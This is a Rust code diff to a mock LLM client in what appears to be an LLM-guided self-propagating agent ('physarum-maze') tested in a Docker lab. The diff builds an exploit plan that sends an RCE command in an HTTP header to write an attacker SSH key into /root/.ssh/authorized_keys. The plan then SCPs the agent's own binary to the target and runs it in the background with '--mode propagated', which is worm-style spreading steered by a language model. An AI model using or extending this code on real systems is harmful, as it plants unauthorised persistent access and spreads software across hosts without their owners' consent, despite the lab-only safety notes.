@@ -21,14 +21,31 @@ use crate::{
 ///   - unit and integration tests
 ///   - Docker Lab dry-runs where a real LLM endpoint is not available
 ///   - CI runs
+///
+/// # Ephemeral pubkey substitution
+///
+/// `exploit_rce_ssh_first` stores the sentinel `__EPHEMERAL_PUBKEY__` in the
+/// HttpPost header rather than a real key. When `uses_ephemeral_pubkey` is true,
+/// `query_propagation` replaces the sentinel with `query.ephemeral_pubkey` at
+/// call time so the real ephemeral key — generated just before the query — is
+/// what gets written into the target's `authorized_keys` via the RCE step.
+///
+/// Without this substitution the SCP step would fail: the target would have a
+/// placeholder in `authorized_keys` while host-a holds a different private key.
 pub struct MockLlmClient {
     strategy: Arc<PropagationStrategy>,
+    /// When true, query_propagation replaces __EPHEMERAL_PUBKEY__ in every
+    /// HttpPost header value with query.ephemeral_pubkey before returning.
+    uses_ephemeral_pubkey: bool,
 }
+
+const EPHEMERAL_PUBKEY_SENTINEL: &str = "__EPHEMERAL_PUBKEY__";
 
 impl MockLlmClient {
     pub fn new(strategy: PropagationStrategy) -> Self {
         Self {
             strategy: Arc::new(strategy),
+            uses_ephemeral_pubkey: false,
         }
     }
 
@@ -89,105 +106,108 @@ impl MockLlmClient {
 
     /// Returns an Exploit strategy for any confirmed RCE CVE — SSH-first delivery.
     ///
-    /// Used by `--llm-endpoint mock-exploit[:<ip>[:<port>]]` for Phase 2 dry-run:
-    ///   Step 1 — HttpPost: CVE RCE payload plants ephemeral pubkey in authorized_keys.
+    /// Used by `--llm-endpoint mock-exploit:<port>:<user>` for Phase 2 dry-run:
+    ///   Step 1 — HttpPost: RCE payload plants the ephemeral pubkey in authorized_keys.
     ///   Step 2 — ScpUpload: transfers physarum-maze binary via SSH (ephemeral key).
     ///   Step 3 — SshCommand: executes binary with nohup in background.
     ///
-    /// This mirrors the SSH-first path the real LLM would choose when port 22 is open.
-    /// `pubkey` is the ephemeral pubkey string injected at runtime by the executor.
+    /// The HttpPost header uses the sentinel `__EPHEMERAL_PUBKEY__` at construction
+    /// time. `query_propagation` replaces it with `query.ephemeral_pubkey` at call
+    /// time so the key written to `authorized_keys` matches the private key that
+    /// the executor will use for the subsequent SCP and SSH steps.
+    ///
     /// `target_port` is the HTTP port of the vulnerable service (e.g. 8080 for Struts).
     pub fn exploit_rce_ssh_first(
-        pubkey: impl Into<String>,
         target_port: u16,
         remote_user: impl Into<String>,
         confidence: f32,
     ) -> Self {
-        let pubkey = pubkey.into();
         let user = remote_user.into();
 
-        // Step 1: RCE payload plants the pubkey — LLM would fill in CVE-specific syntax.
-        // Mock uses a generic shell command as placeholder (real LLM uses CVE-specific injection).
+        // Sentinel substituted at query_propagation time with the real ephemeral pubkey.
         let pubkey_cmd = format!(
             "mkdir -p /root/.ssh && chmod 700 /root/.ssh \
-             && echo '{pubkey}' >> /root/.ssh/authorized_keys \
+             && echo '{EPHEMERAL_PUBKEY_SENTINEL}' >> /root/.ssh/authorized_keys \
              && chmod 600 /root/.ssh/authorized_keys"
         );
 
-        Self::new(PropagationStrategy {
-            method: crate::types::PropagationMethod::Exploit {
-                cve: "CVE-MOCK-RCE".into(),
-            },
-            artifact_type: ArtifactType::AgentBinary,
-            bootstrap_plan: Some(BootstrapPlan {
-                steps: vec![
-                    // Step 1: plant pubkey via RCE
-                    BootstrapStep {
-                        action: crate::types::BootstrapAction::HttpPost {
-                            path: "/exploit".into(),
-                            body: String::new(),
-                            port: Some(target_port),
-                            headers: vec![("X-Rce-Cmd".into(), pubkey_cmd)],
-                            accept_any_response: true,
+        Self {
+            uses_ephemeral_pubkey: true,
+            strategy: Arc::new(PropagationStrategy {
+                method: crate::types::PropagationMethod::Exploit {
+                    cve: "CVE-MOCK-RCE".into(),
+                },
+                artifact_type: ArtifactType::AgentBinary,
+                bootstrap_plan: Some(BootstrapPlan {
+                    steps: vec![
+                        // Step 1: plant pubkey via RCE — sentinel replaced at query time
+                        BootstrapStep {
+                            action: crate::types::BootstrapAction::HttpPost {
+                                path: "/exploit".into(),
+                                body: String::new(),
+                                port: Some(target_port),
+                                headers: vec![("X-Rce-Cmd".into(), pubkey_cmd)],
+                                accept_any_response: true,
+                            },
+                            target: String::new(),
+                            timeout_ms: 10_000,
+                            requires_root: false,
+                            expected_result: ExpectedResult {
+                                success_indicator: "RCE fired — pubkey planted".into(),
+                                failure_indicator: Some("Connection refused or timeout".into()),
+                            },
                         },
-                        target: String::new(),
-                        timeout_ms: 10_000,
-                        requires_root: false,
-                        expected_result: ExpectedResult {
-                            success_indicator: "RCE fired — pubkey planted".into(),
-                            failure_indicator: Some("Connection refused or timeout".into()),
+                        // Step 2: SCP the binary (executor uses ephemeral key automatically)
+                        BootstrapStep {
+                            action: crate::types::BootstrapAction::ScpUpload {
+                                local_path: "__self__".into(),
+                                remote_path: "/tmp/physarum/physarum-maze".into(),
+                                user: Some(user.clone()),
+                            },
+                            target: String::new(),
+                            timeout_ms: 15_000,
+                            requires_root: false,
+                            expected_result: ExpectedResult {
+                                success_indicator: "SCP exit 0".into(),
+                                failure_indicator: Some("SCP error".into()),
+                            },
                         },
-                    },
-                    // Step 2: SCP the binary (executor uses ephemeral key automatically)
-                    BootstrapStep {
-                        action: crate::types::BootstrapAction::ScpUpload {
-                            local_path: "__self__".into(),
-                            remote_path: "/tmp/physarum/physarum-maze".into(),
-                            user: Some(user.clone()),
+                        // Step 3: execute in background
+                        BootstrapStep {
+                            action: crate::types::BootstrapAction::SshCommand {
+                                command:
+                                    "mkdir -p /tmp/physarum && chmod +x /tmp/physarum/physarum-maze \
+                                         && nohup /tmp/physarum/physarum-maze --mode propagated \
+                                            >/tmp/physarum/agent.log 2>&1 &"
+                                        .into(),
+                                user: Some(user.clone()),
+                            },
+                            target: String::new(),
+                            timeout_ms: 10_000,
+                            requires_root: false,
+                            expected_result: ExpectedResult {
+                                success_indicator: "SSH exit 0".into(),
+                                failure_indicator: Some("SSH error".into()),
+                            },
                         },
-                        target: String::new(),
-                        timeout_ms: 15_000,
-                        requires_root: false,
-                        expected_result: ExpectedResult {
-                            success_indicator: "SCP exit 0".into(),
-                            failure_indicator: Some("SCP error".into()),
-                        },
-                    },
-                    // Step 3: execute in background
-                    BootstrapStep {
-                        action: crate::types::BootstrapAction::SshCommand {
-                            command:
-                                "mkdir -p /tmp/physarum && chmod +x /tmp/physarum/physarum-maze \
-                                     && nohup /tmp/physarum/physarum-maze --mode propagated \
-                                        >/tmp/physarum/agent.log 2>&1 &"
-                                    .into(),
-                            user: Some(user.clone()),
-                        },
-                        target: String::new(),
-                        timeout_ms: 10_000,
-                        requires_root: false,
-                        expected_result: ExpectedResult {
-                            success_indicator: "SSH exit 0".into(),
-                            failure_indicator: Some("SSH error".into()),
-                        },
-                    },
+                    ],
+                }),
+                confidence,
+                reasoning_summary: format!(
+                    "Mock: RCE → pubkey injection → SCP binary (user={user}) → nohup exec via SSH."
+                ),
+                preconditions: vec![
+                    "HTTP port open (vulnerable service)".into(),
+                    "Port 22 open (sshd running on target)".into(),
+                    "RCE confirmed by CVE template".into(),
+                ],
+                validation_check: Some("/tmp/physarum/physarum-maze running on target".into()),
+                safety_notes: vec![
+                    "Mock exploit client — Docker Lab Phase 2 only.".into(),
+                    "RCE + SSH access — isolated lab environment only.".into(),
                 ],
             }),
-            confidence,
-            reasoning_summary: format!(
-                "Mock: RCE → pubkey injection → SCP binary (user={user}) → nohup exec via SSH."
-            ),
-            preconditions: vec![
-                "HTTP port open (vulnerable service)".into(),
-                "Port 22 open (sshd running on target)".into(),
-                "RCE confirmed by CVE template".into(),
-            ],
-            validation_check: Some("/tmp/physarum/physarum-maze running on target".into()),
-            safety_notes: vec![
-                "Mock exploit client — Docker Lab Phase 2 only.".into(),
-                "RCE + SSH access — isolated lab environment only.".into(),
-            ],
-        })
+        }
     }
 
     /// Returns an HTTP strategy WITH a real bootstrap plan (HttpGet step).
@@ -263,8 +283,33 @@ impl LlmClient for MockLlmClient {
         })
     }
 
-    fn query_propagation<'a>(&'a self, _query: &'a DiscoveryQuery) -> QueryFuture<'a> {
+    fn query_propagation<'a>(&'a self, query: &'a DiscoveryQuery) -> QueryFuture<'a> {
         let strategy = Arc::clone(&self.strategy);
-        Box::pin(async move { Ok((*strategy).clone()) })
+        let pubkey = if self.uses_ephemeral_pubkey {
+            query.ephemeral_pubkey.clone()
+        } else {
+            None
+        };
+        Box::pin(async move {
+            let Some(real_pubkey) = pubkey else {
+                return Ok((*strategy).clone());
+            };
+            // Substitute the sentinel in every HttpPost header value.
+            let mut s = (*strategy).clone();
+            if let Some(ref mut plan) = s.bootstrap_plan {
+                for step in &mut plan.steps {
+                    if let crate::types::BootstrapAction::HttpPost { ref mut headers, .. } =
+                        step.action
+                    {
+                        for (_, v) in headers.iter_mut() {
+                            if v.contains(EPHEMERAL_PUBKEY_SENTINEL) {
+                                *v = v.replace(EPHEMERAL_PUBKEY_SENTINEL, &real_pubkey);
+                            }
+                        }
+                    }
+                }
+            }
+            Ok(s)
+        })
     }
 }
